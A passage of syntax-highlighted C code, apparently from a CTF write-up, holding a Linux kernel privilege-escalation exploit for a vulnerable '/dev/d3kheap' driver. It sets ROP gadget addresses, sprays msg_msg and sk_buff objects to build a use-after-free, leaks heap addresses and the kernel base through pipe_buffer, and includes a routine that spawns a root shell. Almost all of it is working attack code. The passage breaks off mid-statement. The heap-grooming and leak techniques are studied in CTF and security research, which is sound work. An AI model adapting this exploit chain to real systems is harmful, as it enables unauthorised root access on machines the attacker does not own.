0xffffffff81327570</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> POP_R14_POP_RBP_RET 0xffffffff81003364</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PUSH_RSI_POP_RSP_POP_4VAL_RET 0xffffffff812dbede</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> CALL_RSI_PTR 0xffffffff8105acec</span></span><br><span class="line"></span><br><span class="line"><span class="type">size_t</span> user_cs, user_ss, user_sp, user_rflags;</span><br><span class="line"><span class="type">size_t</span> kernel_offset, kernel_base = <span class="number">0xffffffff81000000</span>;</span><br><span class="line"><span class="type">size_t</span> prepare_kernel_cred, commit_creds, swapgs_restore_regs_and_return_to_usermode, init_cred;</span><br><span class="line"></span><br><span class="line"><span class="type">long</span> dev_fd;</span><br><span class="line"><span class="type">int</span> pipe_fd[<span class="number">2</span>], pipe_fd2[<span class="number">2</span>], pipe_fd_1;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * skb_shared_info need to take 320 bytes at the tail</span></span><br><span class="line"><span class="comment"> * so the max size of buf we should send is:</span></span><br><span class="line"><span class="comment"> * 1024 - 320 = 704</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">char</span> fake_secondary_msg[<span class="number">704</span>];</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">add</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    ioctl(dev_fd, OBJ_ADD);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">del</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    ioctl(dev_fd, OBJ_DEL);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">size_t</span> user_cs, user_ss, user_sp, user_rflags;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">saveStatus</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    __asm__(<span class="string">&quot;mov user_cs, cs;&quot;</span></span><br><span class="line">            <span class="string">&quot;mov user_ss, ss;&quot;</span></span><br><span class="line">            <span class="string">&quot;mov user_sp, rsp;&quot;</span></span><br><span class="line">            <span class="string">&quot;pushf;&quot;</span></span><br><span class="line">            <span class="string">&quot;pop user_rflags;&quot;</span></span><br><span class="line">            );</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[34m\033[1m[*] Status has been saved.\033[0m\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">list_head</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="type">uint64_t</span>    next;</span><br><span class="line">    <span class="type">uint64_t</span>    prev;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">msg_msg</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">m_list</span>;</span></span><br><span class="line">    <span class="type">uint64_t</span>    m_type;</span><br><span class="line">    <span class="type">uint64_t</span>    m_ts;</span><br><span class="line">    <span class="type">uint64_t</span>    next;</span><br><span class="line">    <span class="type">uint64_t</span>    security;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">msg_msgseg</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="type">uint64_t</span>    next;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> </span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="type">long</span> mtype;</span><br><span class="line">    <span class="type">char</span> mtext[PRIMARY_MSG_SIZE - <span class="keyword">sizeof</span>(<span class="keyword">struct</span> msg_msg)];</span><br><span class="line">&#125;primary_msg;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> </span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="type">long</span> mtype;</span><br><span class="line">    <span class="type">char</span> mtext[SECONDARY_MSG_SIZE - <span class="keyword">sizeof</span>(<span class="keyword">struct</span> msg_msg)];</span><br><span class="line">&#125;secondary_msg;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="type">long</span> mtype;</span><br><span class="line">    <span class="type">char</span> mtext[<span class="number">0x1000</span> - <span class="keyword">sizeof</span>(<span class="keyword">struct</span> msg_msg) + <span class="number">0x1000</span> - <span class="keyword">sizeof</span>(<span class="keyword">struct</span> msg_msgseg)];</span><br><span class="line">&#125; oob_msg;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">pipe_buffer</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="type">uint64_t</span>    page;</span><br><span class="line">    <span class="type">uint32_t</span>    offset, len;</span><br><span class="line">    <span class="type">uint64_t</span>    ops;</span><br><span class="line">    <span class="type">uint32_t</span>    flags;</span><br><span class="line">    <span class="type">uint32_t</span>    padding;</span><br><span class="line">    <span class="type">uint64_t</span>    private;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">pipe_buf_operations</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="type">uint64_t</span>    confirm;</span><br><span class="line">    <span class="type">uint64_t</span>    release;</span><br><span class="line">    <span class="type">uint64_t</span>    try_steal;</span><br><span class="line">    <span class="type">uint64_t</span>    get;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">errExit</span><span class="params">(<span class="type">char</span> *msg)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[31m\033[1m[x] Error: %s\033[0m\n&quot;</span>, msg);</span><br><span class="line">    <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">readMsg</span><span class="params">(<span class="type">int</span> msqid, <span class="type">void</span> *msgp, <span class="type">size_t</span> msgsz, <span class="type">long</span> msgtyp)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">return</span> msgrcv(msqid, msgp, msgsz - <span class="keyword">sizeof</span>(<span class="type">long</span>), msgtyp, <span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">writeMsg</span><span class="params">(<span class="type">int</span> msqid, <span class="type">void</span> *msgp, <span class="type">size_t</span> msgsz, <span class="type">long</span> msgtyp)</span></span><br><span class="line">&#123;</span><br><span class="line">    *(<span class="type">long</span>*)msgp = msgtyp;</span><br><span class="line">    <span class="keyword">return</span> msgsnd(msqid, msgp, msgsz - <span class="keyword">sizeof</span>(<span class="type">long</span>), <span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">peekMsg</span><span class="params">(<span class="type">int</span> msqid, <span class="type">void</span> *msgp, <span class="type">size_t</span> msgsz, <span class="type">long</span> msgtyp)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">return</span> msgrcv(msqid, msgp, msgsz - <span class="keyword">sizeof</span>(<span class="type">long</span>), msgtyp, MSG_COPY | IPC_NOWAIT);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">buildMsg</span><span class="params">(<span class="keyword">struct</span> msg_msg *msg, <span class="type">uint64_t</span> m_list_next,</span></span><br><span class="line"><span class="params">    <span class="type">uint64_t</span> m_list_prev, <span class="type">uint64_t</span> m_type, <span class="type">uint64_t</span> m_ts, </span></span><br><span class="line"><span class="params">    <span class="type">uint64_t</span> next, <span class="type">uint64_t</span> security)</span></span><br><span class="line">&#123;</span><br><span class="line">    msg-&gt;m_list.next = m_list_next;</span><br><span class="line">    msg-&gt;m_list.prev = m_list_prev;</span><br><span class="line">    msg-&gt;m_type = m_type;</span><br><span class="line">    msg-&gt;m_ts = m_ts;</span><br><span class="line">    msg-&gt;next = next;</span><br><span class="line">    msg-&gt;security = security;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">spraySkBuff</span><span class="params">(<span class="type">int</span> sk_socket[SOCKET_NUM][<span class="number">2</span>], <span class="type">void</span> *buf, <span class="type">size_t</span> size)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; SOCKET_NUM; i++)</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; SK_BUFF_NUM; j++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="comment">// printf(&quot;[-] now %d, num %d\n&quot;, i, j);</span></span><br><span class="line">            <span class="keyword">if</span> (write(sk_socket[i][<span class="number">0</span>], buf, size) &lt; <span class="number">0</span>)</span><br><span class="line">                <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">freeSkBuff</span><span class="params">(<span class="type">int</span> sk_socket[SOCKET_NUM][<span class="number">2</span>], <span class="type">void</span> *buf, <span class="type">size_t</span> size)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; SOCKET_NUM; i++)</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; SK_BUFF_NUM; j++)</span><br><span class="line">            <span class="keyword">if</span> (read(sk_socket[i][<span class="number">1</span>], buf, size) &lt; <span class="number">0</span>)</span><br><span class="line">                <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">getRootShell</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span> (getuid())</span><br><span class="line">        errExit(<span class="string">&quot;failed to gain the root!&quot;</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] Succesfully gain the root privilege, trigerring root shell now...\033[0m\n&quot;</span>);</span><br><span class="line">    system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> **argv, <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span>         oob_pipe_fd[<span class="number">2</span>];</span><br><span class="line">    <span class="type">int</span>         sk_sockets[SOCKET_NUM][<span class="number">2</span>];</span><br><span class="line">    <span class="type">int</span>         pipe_fd[PIPE_NUM][<span class="number">2</span>];</span><br><span class="line">    <span class="type">int</span>         msqid[MSG_QUEUE_NUM];</span><br><span class="line">    <span class="type">int</span>         victim_qid, real_qid;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">msg_msg</span>  *<span class="title">nearby_msg</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">msg_msg</span>  *<span class="title">nearby_msg_prim</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">pipe_buffer</span> *<span class="title">pipe_buf_ptr</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">pipe_buf_operations</span> *<span class="title">ops_ptr</span>;</span></span><br><span class="line">    <span class="type">uint64_t</span>    victim_addr;</span><br><span class="line">    <span class="type">uint64_t</span>    kernel_base;</span><br><span class="line">    <span class="type">uint64_t</span>    kernel_offset;</span><br><span class="line">    <span class="type">uint64_t</span>    *rop_chain;</span><br><span class="line">    <span class="type">int</span>         rop_idx;</span><br><span class="line">    <span class="type">cpu_set_t</span>   cpu_set;</span><br><span class="line"></span><br><span class="line">    saveStatus();</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * Step.O</span></span><br><span class="line"><span class="comment">     * Initialization</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// run the exp on specific core only</span></span><br><span class="line">    CPU_ZERO(&amp;cpu_set);</span><br><span class="line">    CPU_SET(<span class="number">0</span>, &amp;cpu_set);</span><br><span class="line">    sched_setaffinity(getpid(), <span class="keyword">sizeof</span>(cpu_set), &amp;cpu_set);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// socket pairs to spray sk_buff</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; SOCKET_NUM; i++)</span><br><span class="line">        <span class="keyword">if</span> (socketpair(AF_UNIX, SOCK_STREAM, <span class="number">0</span>, sk_sockets[i]) &lt; <span class="number">0</span>)</span><br><span class="line">            errExit(<span class="string">&quot;failed to create socket pair!&quot;</span>);</span><br><span class="line">    </span><br><span class="line">    dev_fd = open(<span class="string">&quot;/dev/d3kheap&quot;</span>, O_RDONLY);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * Step.I</span></span><br><span class="line"><span class="comment">     * build msg_queue, spray primary and secondary msg_msg,</span></span><br><span class="line"><span class="comment">     * and use OOB write to construct the overlapping</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\n\033[34m\033[1m[*] Step.I spray msg_msg, construct overlapping object\033[0m&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] Build message queue...&quot;</span>);</span><br><span class="line">    <span class="comment">// build 4096 message queue</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; MSG_QUEUE_NUM; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> ((msqid[i] = msgget(IPC_PRIVATE, <span class="number">0666</span> | IPC_CREAT)) &lt; <span class="number">0</span>)</span><br><span class="line">            errExit(<span class="string">&quot;failed to create msg_queue!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] Spray primary and secondary msg_msg...&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">memset</span>(&amp;primary_msg, <span class="number">0</span>, <span class="keyword">sizeof</span>(primary_msg));</span><br><span class="line">    <span class="built_in">memset</span>(&amp;secondary_msg, <span class="number">0</span>, <span class="keyword">sizeof</span>(secondary_msg));</span><br><span class="line"></span><br><span class="line">    <span class="comment">// get a free object</span></span><br><span class="line">    add();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// spray primary and secondary message</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; MSG_QUEUE_NUM; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        *(<span class="type">int</span> *)&amp;primary_msg.mtext[<span class="number">0</span>] = MSG_TAG;</span><br><span class="line">        *(<span class="type">int</span> *)&amp;primary_msg.mtext[<span class="number">4</span>] = i;</span><br><span class="line">        <span class="keyword">if</span> (writeMsg(msqid[i], &amp;primary_msg, </span><br><span class="line">                <span class="keyword">sizeof</span>(primary_msg), PRIMARY_MSG_TYPE) &lt; <span class="number">0</span>)</span><br><span class="line">            errExit(<span class="string">&quot;failed to send primary msg!&quot;</span>);</span><br><span class="line"></span><br><span class="line">        *(<span class="type">int</span> *)&amp;secondary_msg.mtext[<span class="number">0</span>] = MSG_TAG;</span><br><span class="line">        *(<span class="type">int</span> *)&amp;secondary_msg.mtext[<span class="number">4</span>] = i;</span><br><span class="line">        <span class="keyword">if</span> (writeMsg(msqid[i], &amp;secondary_msg, </span><br><span class="line">                <span class="keyword">sizeof</span>(secondary_msg), SECONDARY_MSG_TYPE) &lt; <span class="number">0</span>)</span><br><span class="line">            errExit(<span class="string">&quot;failed to send secondary msg!&quot;</span>);</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> (i == <span class="number">1024</span>)</span><br><span class="line">            del();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * Step.II</span></span><br><span class="line"><span class="comment">     * construct UAF</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\n\033[34m\033[1m[*] Step.II construct UAF\033[0m&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// free the victim secondary msg_msg, then we get a UAF</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] Trigger UAF...&quot;</span>);</span><br><span class="line">    del();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// spray sk_buff to mark the UAF msg_msg</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] spray sk_buff...&quot;</span>);</span><br><span class="line">    buildMsg((<span class="keyword">struct</span> msg_msg *)fake_secondary_msg, </span><br><span class="line">            *(<span class="type">uint64_t</span>*)<span class="string">&quot;arttnba3&quot;</span>, *(<span class="type">uint64_t</span>*)<span class="string">&quot;arttnba3&quot;</span>, </span><br><span class="line">            *(<span class="type">uint64_t</span>*)<span class="string">&quot;arttnba3&quot;</span>, SECONDARY_MSG_SIZE, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> (spraySkBuff(sk_sockets, fake_secondary_msg, </span><br><span class="line">            <span class="keyword">sizeof</span>(fake_secondary_msg)) &lt; <span class="number">0</span>)</span><br><span class="line">        errExit(<span class="string">&quot;failed to spray sk_buff!&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// find out the UAF queue</span></span><br><span class="line">    victim_qid = <span class="number">-1</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; MSG_QUEUE_NUM; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">         * the msg_msg got changed, so we can&#x27;t read out</span></span><br><span class="line"><span class="comment">         * but it tells us which one the victim is</span></span><br><span class="line"><span class="comment">        */</span></span><br><span class="line">        <span class="keyword">if</span> (peekMsg(msqid[i], &amp;secondary_msg, <span class="keyword">sizeof</span>(secondary_msg), <span class="number">1</span>) &lt; <span class="number">0</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;[+] victim qid: %d\n&quot;</span>, i);</span><br><span class="line">            victim_qid = i;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (victim_qid == <span class="number">-1</span>)</span><br><span class="line">        errExit(<span class="string">&quot;failed to make the UAF in msg queue!&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (freeSkBuff(sk_sockets, fake_secondary_msg, </span><br><span class="line">            <span class="keyword">sizeof</span>(fake_secondary_msg)) &lt; <span class="number">0</span>)</span><br><span class="line">        errExit(<span class="string">&quot;failed to release sk_buff!&quot;</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[32m\033[1m[+] UAF construction complete!\033[0m&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * Step.III</span></span><br><span class="line"><span class="comment">     * spray sk_buff to leak msg_msg addr</span></span><br><span class="line"><span class="comment">     * construct fake msg_msg to leak addr of UAF obj</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\n\033[34m\033[1m[*] Step.III spray sk_buff to leak kheap addr\033[0m&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// spray sk_buff to construct fake msg_msg</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] spray sk_buff...&quot;</span>);</span><br><span class="line">    buildMsg((<span class="keyword">struct</span> msg_msg *)fake_secondary_msg, </span><br><span class="line">            *(<span class="type">uint64_t</span>*)<span class="string">&quot;arttnba3&quot;</span>, *(<span class="type">uint64_t</span>*)<span class="string">&quot;arttnba3&quot;</span>, </span><br><span class="line">            VICTIM_MSG_TYPE, <span class="number">0x1000</span> - <span class="keyword">sizeof</span>(<span class="keyword">struct</span> msg_msg), <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> (spraySkBuff(sk_sockets, fake_secondary_msg, </span><br><span class="line">            <span class="keyword">sizeof</span>(fake_secondary_msg)) &lt; <span class="number">0</span>)</span><br><span class="line">        errExit(<span class="string">&quot;failed to spray sk_buff!&quot;</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// use fake msg_msg to read OOB</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] OOB read from victim msg_msg&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (peekMsg(msqid[victim_qid], &amp;oob_msg, <span class="keyword">sizeof</span>(oob_msg), <span class="number">1</span>) &lt; <span class="number">0</span>)</span><br><span class="line">        errExit(<span class="string">&quot;failed to read victim msg!&quot;</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> (*(<span class="type">int</span> *)&amp;oob_msg.mtext[SECONDARY_MSG_SIZE] != MSG_TAG)</span><br><span class="line">        errExit(<span class="string">&quot;failed to rehit the UAF object!&quot;</span>);</span><br><span class="line"></span><br><span class="line">    nearby_msg = (<span class="keyword">struct</span> msg_msg*) </span><br><span class="line">            &amp;oob_msg.mtext[(SECONDARY_MSG_SIZE) - <span class="keyword">sizeof</span>(<span class="keyword">struct</span> msg_msg)];</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] addr of primary msg of msg nearby victim: \033[0m%llx\n&quot;</span>, </span><br><span class="line">            nearby_msg-&gt;m_list.prev);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// release and re-spray sk_buff to construct fake msg_msg</span></span><br><span class="line">    <span class="comment">// so that we can make an arbitrary read on a primary msg_msg</span></span><br><span class="line">    <span class="keyword">if</span> (freeSkBuff(sk_sockets, fake_secondary_msg, </span><br><span class="line">            <span class="keyword">sizeof</span>(fake_secondary_msg)) &lt; <span class="number">0</span>)</span><br><span class="line">        errExit(<span class="string">&quot;failed to release sk_buff!&quot;</span>);</span><br><span class="line">    </span><br><span class="line">    buildMsg((<span class="keyword">struct</span> msg_msg *)fake_secondary_msg, </span><br><span class="line">            *(<span class="type">uint64_t</span>*)<span class="string">&quot;arttnba3&quot;</span>, *(<span class="type">uint64_t</span>*)<span class="string">&quot;arttnba3&quot;</span>, </span><br><span class="line">            VICTIM_MSG_TYPE, <span class="keyword">sizeof</span>(oob_msg.mtext), </span><br><span class="line">            nearby_msg-&gt;m_list.prev - <span class="number">8</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> (spraySkBuff(sk_sockets, fake_secondary_msg, </span><br><span class="line">            <span class="keyword">sizeof</span>(fake_secondary_msg)) &lt; <span class="number">0</span>)</span><br><span class="line">        errExit(<span class="string">&quot;failed to spray sk_buff!&quot;</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] arbitrary read on primary msg of msg nearby victim&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (peekMsg(msqid[victim_qid], &amp;oob_msg, <span class="keyword">sizeof</span>(oob_msg), <span class="number">1</span>) &lt; <span class="number">0</span>)</span><br><span class="line">        errExit(<span class="string">&quot;failed to read victim msg!&quot;</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> (*(<span class="type">int</span> *)&amp;oob_msg.mtext[<span class="number">0x1000</span>] != MSG_TAG)</span><br><span class="line">        errExit(<span class="string">&quot;failed to rehit the UAF object!&quot;</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// cal the addr of UAF obj by the header we just read out</span></span><br><span class="line">    nearby_msg_prim = (<span class="keyword">struct</span> msg_msg*) </span><br><span class="line">            &amp;oob_msg.mtext[<span class="number">0x1000</span> - <span class="keyword">sizeof</span>(<span class="keyword">struct</span> msg_msg)];</span><br><span class="line">    victim_addr = nearby_msg_prim-&gt;m_list.next - <span class="number">0x400</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] addr of msg next to victim: \033[0m%llx\n&quot;</span>, </span><br><span class="line">            nearby_msg_prim-&gt;m_list.next);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] addr of msg UAF object: \033[0m%llx\n&quot;</span>, victim_addr);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * Step.IV</span></span><br><span class="line"><span class="comment">     * fix the header of UAF obj and release it</span></span><br><span class="line"><span class="comment">     * spray pipe_buffer and leak the kernel base</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\n\033[34m\033[1m[*] Step.IV spray pipe_buffer to leak kernel base\033[0m&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// re-construct the msg_msg to fix it</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] fixing the UAF obj as a msg_msg...&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (freeSkBuff(sk_sockets, fake_secondary_msg, </span><br><span class="line">            <span class="keyword">sizeof</span>(fake_secondary_msg)) &lt; <span class="number">0</span>)</span><br><span class="line">        errExit(<span class="string">&quot;failed to release sk_buff!&quot;</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">memset</span>(fake_secondary_msg, <span class="number">0</span>, <span class="keyword">sizeof</span>(fake_secondary_msg));</span><br><span class="line">    buildMsg((<span class="keyword">struct</span> msg_msg *)fake_secondary_msg, </span><br><span class="line">            victim_addr + <span class="number">0x800</span>, victim_addr + <span class="number">0x800</span>, <span class="comment">// a valid kheap addr is valid</span></span><br><span class="line">            VICTIM_MSG_TYPE, SECONDARY_MSG_SIZE - <span class="keyword">sizeof</span>(<span class="keyword">struct</span> msg_msg), </span><br><span class="line">            <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> (spraySkBuff(sk_sockets, fake_secondary_msg, </span><br><span class="line">            <span class="keyword">sizeof</span>(fake_secondary_msg)) &lt; <span class="number">0</span>)</span><br><span class="line">        errExit(<span class="string">&quot;failed to spray sk_buff!&quot;</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// release UAF obj as secondary msg</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] release UAF obj in message queue...&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (readMsg(msqid[victim_qid], &amp;secondary_msg, </span><br><span class="line">                <span class="keyword">sizeof</span>(secondary_msg), VICTIM_MSG_TYPE) &lt; <span class="number">0</span>)</span><br><span class="line">        errExit(<span class="string">&quot;failed to receive secondary msg!&quot;</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// spray pipe_buffer</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] spray pipe_buffer...&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; PIPE_NUM; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (pipe(pipe_fd[i]) &lt; <span class="number">0</span>)</span><br><span class="line">            errExit(<span class="string">&quot;failed to create pipe!&quot;</span>);</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// write something to activate it</span></span><br><span class="line">        <span class="keyword">if</span> (write(pipe_fd[i][<span class="number">1</span>], <span class="string">&quot;arttnba3&quot;</span>, <span class="number">8</span>) &lt; <span class="number">0</span>)</span><br><span class="line">            errExit(<span class="string">&quot;failed to write the pipe!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// release the sk_buff to read pipe_buffer, leak kernel base</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] release sk_buff to read pipe_buffer...&quot;</span>);</span><br><span class="line">    pipe_buf_ptr = (<span class="keyword">struct</span> pipe_buffer *) &amp;fake_secondary_msg;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; SOCKET_NUM; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; SK_BUFF_NUM; j++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span> (read(sk_sockets[i][<span class="number">1</span>], &amp;fake_secondary_msg, </span><br><span class="line">                    <span class="keyword">sizeof</span>(fake_secondary_msg)) &lt; <span class="number">0</span>)</span><br><span class="line">                errExit(<span class="string">&quot;failed to release sk_buff!&quot;</span>);</span><br><span class="line">            </span><br><span class="line">            <span class="keyword">if</span> (pipe_buf_ptr-&gt;ops &gt; <span class="number">0xffffffff81000000</span>)</span><br><span class="line">            